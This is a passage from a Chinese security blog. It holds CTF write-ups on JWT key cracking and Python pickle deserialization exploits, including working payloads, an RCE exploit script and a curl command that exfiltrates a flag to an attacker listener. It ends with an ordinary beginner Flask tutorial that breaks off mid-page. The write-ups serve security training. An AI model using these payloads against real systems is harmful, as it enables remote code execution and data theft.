    <span class="token keyword">if</span> <span class="token string">"static/img/lv/lv6.png"</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>跑出lv6在<code>page=181</code>的页面，点击购买钱不够，发现有折扣，于是抓包改折扣为0.0000001，随后提示需要是<code>admin</code>，抓包注意到有一个<code>jwt</code>的<code>cookie</code>，<a href="https://www.jianshu.com/p/576dbf44b2ae">参考</a>，这里有一个编解码<a href="https://jwt.io/#debugger-io">网站</a>，再找到爆破密钥脚本<a href="https://github.com/brendan-rius/c-jwt-cracker">网站</a>，跑出来密钥为<code>1kun</code>，放到编码网站编码后携带这个<code>jwt</code>的<code>cookie</code>发包，随后来到<code>b1g_m4mber</code>界面，查看源码得到<code>www.zip</code>源码包，找到关键利用的代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web
<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> urllib


<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>
    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>

    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>
    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>

<p>明显的pickle反序列化利用，POST的<code>become</code>为利用点，随后构造反序列化利用poc：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
<span class="token comment"># 题目是在python2环境下，需要用python2跑</span>
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> urllib

<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token builtin">eval</span>直接读取文件

today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># print(pickle.dumps(today))</span>
x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>得到payload：</p>
<pre class="language-python" data-language="python"><code class="language-python">c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span>0A<span class="token operator">%</span>28S<span class="token operator">%</span>22open<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>27r<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span>0A<span class="token punctuation">.</span></code></pre>

<p>传入发包得到flag</p>
<h3 id="第一届“长城杯”网络安全大赛院校组-ez-python"><a href="#第一届“长城杯”网络安全大赛院校组-ez-python" class="headerlink" title="第一届“长城杯”网络安全大赛院校组-ez_python"></a>第一届“长城杯”网络安全大赛院校组-ez_python</h3><p>源码提示 <code>&lt;!--    ?pic=1.jpg   --&gt;</code>，尝试读取<code>/etc/passwd</code>可以读取</p>
<p><code>/proc/self/environ</code>读取环境变量   <a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/">敏感文件搜集</a></p>
<pre class="language-none"><code class="language-none">MAIL&#x3D;&#x2F;var&#x2F;mail&#x2F;app
USER&#x3D;app
HOSTNAME&#x3D;engine-1
SHLVL&#x3D;1
PYTHON_PIP_VERSION&#x3D;20.1
HOME&#x3D;&#x2F;home&#x2F;app
GPG_KEY&#x3D;E3FF2839C048B25C084DEBE9B26995E310250568
LOGNAME&#x3D;app
_&#x3D;&#x2F;bin&#x2F;su
PYTHON_GET_PIP_URL&#x3D;https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;get-pip&#x2F;raw&#x2F;1fe530e9e3d800be94e04f6428460fc4fb94f5a9&#x2F;get-pip.py
TERM&#x3D;xterm
PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin
LANG&#x3D;C.UTF-8
SHELL&#x3D;&#x2F;bin&#x2F;sh
PYTHON_VERSION&#x3D;3.8.2
PWD&#x3D;&#x2F;app
PYTHON_GET_PIP_SHA256&#x3D;ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</code></pre>

<p>又环境变量得知<code>PYTHON_VERSION=3.8.2</code>，<code>PWD=/app</code></p>
<p>联想<code>python</code>题目的一般形式，<code>flask</code>写的一般入口为<code>app.py</code>，读取源代码 <code>/app/app.py</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>send_from_directory
<span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_file

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token number">1</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        user <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> check<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>
            user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            username <span class="token operator">=</span> <span class="token string">"bad,bad,hacker"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token string">"CTFer"</span>
    pic <span class="token operator">=</span> <span class="token string">'&#123;0&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        pic<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'pic'</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        pic<span class="token operator">=</span><span class="token string">'&#123;0&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> uname<span class="token operator">=</span>username<span class="token punctuation">,</span> pic<span class="token operator">=</span>p <span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span></code></pre>

<p>明显的<code>pickle</code>反序列化，不过有一个<code>check</code>，限制了<code>R</code>指令，即不能使用<code>__reduce__</code>执行命令了，当是我们这题要需要<code>RCE</code>来读<code>flag</code></p>
<p>这里可以使用BUILD指令（指令码为<code>b</code>）绕过，实现<code>RCE</code>效果，参考我原来写的：<a href="https://www.extrader.top/posts/488d0f65/">Python反序列化漏洞浅析</a></p>
<p>先构造一个初始<code>payload</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools
<span class="token keyword">import</span> os
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

user <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>输出反序列化后的结果<code>\x80\x03c__main__\nUser\nq\x00)\x81q\x01.</code>，这里的符号含义就不解释了 </p>
<p>在<code>payload</code>里面添加<code>b</code>指令码操作，由于没有回显，我们使用<code>sleep</code>延时判断是否命令执行成功</p>
<pre class="language-none"><code class="language-none">\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVsleep 5\nb.</code></pre>

<p>放到<code>cookie</code>发包，成功延时5s，于是<code>curl</code>请求外带来执行命令</p>
<pre class="language-none"><code class="language-none">\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl http:&#x2F;&#x2F;ip:2333&#x2F;&#96;ls &#x2F; | base64&#96;\nb.</code></pre>

<pre class="language-none"><code class="language-none">\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl http:&#x2F;&#x2F;ip:2333&#x2F;&#96;cat &#x2F;flagggggggggggggaaa | base64&#96;\nb.</code></pre>

<p>在自己服务器上<code>nc -lvnp 2333</code>，可以收到base64编码后的flag，解码即可</p>
<p>写个exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> base64

urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

url <span class="token operator">=</span> <span class="token string">"http://eci-2ze3ul2c0sy8uv9fos2o.cloudeci1.ichunqiu.com:8888/"</span>

headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) "</span>
                  <span class="token string">"Chrome/88.0.4324.192 Mobile Safari/537.36 "</span>
<span class="token punctuation">&#125;</span>

payload <span class="token operator">=</span> <span class="token string">b'\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl http://ip:2333/`cat /flagggggggggggggaaa | base64`\nb.'</span>

cookie <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"user"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></code></pre>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>php</tag>
        <tag>反序列化</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>初识Flask</title>
    <url>/posts/ebf6eea3/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt loading="lazy"></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/">Jinja2</a>模板引擎。两者都是Pocco项目。</p>
<p><a href="https://dormousehole.readthedocs.io/en/latest/">Flask中文文档</a></p>
<span id="more"></span>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p>
<p><strong>安装virtualenv</strong></p>
<p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p>
<p>当然如果不想用系统的包的话可以加一些参数：</p>
<p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p>
<p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p>
<p>安装virtualenv包：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> virtualenv</code></pre>

<p>创建环境：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> Flask  <span class="token comment">#创建项目目录</span>
<span class="token builtin class-name">cd</span> Flask
virtualenv -p C:<span class="token punctuation">\</span>Python2<span class="token punctuation">\</span>python.exe E:<span class="token punctuation">\</span>flask<span class="token punctuation">\</span>venv  <span class="token comment">#在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径</span>
.<span class="token punctuation">\</span>venv<span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>activate  <span class="token comment">#启动虚拟环境;deactivate可退出此环境</span></code></pre>

<p>接下来就要在这个虚拟环境中安装Flask了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">E:<span class="token punctuation">\</span>flask<span class="token punctuation">\</span>venv<span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>python.exe -m pip list  <span class="token comment">#可看到当前虚拟环境中的所有的python包，当然不加路径也可以</span>
pip <span class="token function">install</span> Flask</code></pre>

<p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask <span class="token comment">#导入Flask模块</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment">#使用当前模块作为参数</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p>
<ul>
<li><strong>rule</strong>：参数表示与该函数的URL绑定</li>
<li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li>
<li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li>
</ul>
<p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p>
<p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p>
<ul>
<li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li>
<li><strong>port</strong>：端口设置，默认值为5000</li>
<li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li>
<li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li>
</ul>
<p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token comment">#@app.route('/hello')  #添加路由</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World'</span>
app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">,</span><span class="token string">'hello'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>hello_world<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p>
<ul>
<li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li>
<li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li>
<li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li>
<li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li>
</ul>
<h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello &#123; &#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p>
<p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p>
<ul>
<li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li>
<li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li>
<li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li>
</ul>
<h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/name'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'hello Admin'</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/guest/&lt;guest>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_guest</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Hello &#123; &#125; as Guest'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_guest'</span><span class="token punctuation">,</span>guest <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
       
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p>
<ul>
<li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li>
<li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li>
<li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li>
</ul>
<p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p>
<p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p>
<h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
